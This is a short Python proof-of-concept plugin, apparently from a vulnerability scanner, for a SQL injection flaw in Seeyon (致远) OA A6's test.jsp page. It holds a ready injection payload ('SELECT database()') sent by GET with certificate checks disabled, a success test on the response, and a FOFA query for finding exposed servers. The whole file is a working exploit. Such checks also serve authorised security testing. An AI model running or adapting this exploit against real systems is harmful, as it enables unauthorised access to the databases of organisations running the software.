#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/致远OA/致远OA A6 test.jsp SQL注入漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '致远OA A6 test.jsp SQL注入',

      'level'     :   'high',

      'FOFA'      :   'title="致远A8+协同管理软件.A6"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT database())'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "序号" in res.text and 'database()' in res.text:
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret